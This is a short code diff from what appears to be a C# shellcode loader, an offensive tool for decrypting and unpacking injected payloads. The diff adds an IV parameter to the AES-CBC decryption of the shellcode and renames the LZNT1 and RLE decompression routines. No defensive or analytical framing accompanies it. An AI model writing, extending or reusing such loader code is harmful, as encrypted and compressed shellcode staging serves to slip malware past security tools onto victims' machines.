@@ -60,7 +60,7 @@ namespace ShellcodeLoader
 
                 case 4:
                     DebugLogger.WriteLine("[+] Applying AES-CBC decryption...");
-                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey);
+                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey, InjectionConfig.EncryptionIV);
                     break;
 
                 default:
@@ -74,12 +74,12 @@ namespace ShellcodeLoader
             {
                 case 1:
                     DebugLogger.WriteLine("[+] Applying LZNT1 decompression...");
-                    shellcode = CompressionDecodingUtils.DecompressLZNT1(shellcode);
+                    shellcode = CompressionDecodingUtils.DecompressionLZNT(shellcode);
                     break;
 
                 case 2:
                     DebugLogger.WriteLine("[+] Applying RLE decompression...");
-                    shellcode = CompressionDecodingUtils.DecompressRLE(shellcode);
+                    shellcode = CompressionDecodingUtils.DecompressionRLE(shellcode);
                     break;
 
                 default:
